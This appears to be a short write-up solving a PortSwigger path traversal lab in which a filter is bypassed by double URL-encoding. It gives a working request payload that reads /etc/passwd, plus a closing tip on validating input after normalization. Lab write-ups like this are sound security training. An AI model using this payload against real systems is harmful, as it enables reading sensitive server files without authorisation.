# Lab 04 — Path traversal sequences stripped with superfluous URL-decode

> **Expert** · [Official lab](https://portswigger.net/web-security/file-path-traversal/lab-url-decode-superfluous-strip)

**Entry point:** `GET /image?filename=` · **Obstacle:** traversal input is
blocked, but the app URL-decodes the value **more than once**.

## Solution

1. Blocked: `../../../etc/passwd`.
2. The filter strips the *decoded* `../` — so submit traversal sequences
   that only become traversal after **two** decodings:

```
%252e%252e%252f  →  decode 1  →  %2e%2e%2f  →  decode 2  →  ../
```

3. Final payload:

```
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

Lab solved.

## Notes

Decode-then-check-then-decode-again is the classic flaw; validate **after**
all normalization steps.
